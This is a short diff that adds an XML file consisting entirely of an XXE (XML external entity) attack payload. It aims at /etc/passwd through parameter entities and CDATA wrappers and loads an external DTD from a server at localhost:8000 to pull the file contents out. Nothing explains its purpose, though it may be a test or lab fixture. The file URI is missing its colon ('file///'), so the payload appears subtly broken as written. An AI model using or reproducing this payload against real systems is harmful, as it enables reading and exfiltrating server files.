@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+	<!ENTITY % file SYSTEM "file///etc/passwd" >
+	<!ENTITY % start "<![CDATA[">
+	<!ENTITY % end "]]>">
+	<!ENTITY % dtd SYSTEM "http://localhost:8000/dtd">
+%dtd;
+]>
+<foo>&xxe;</foo>
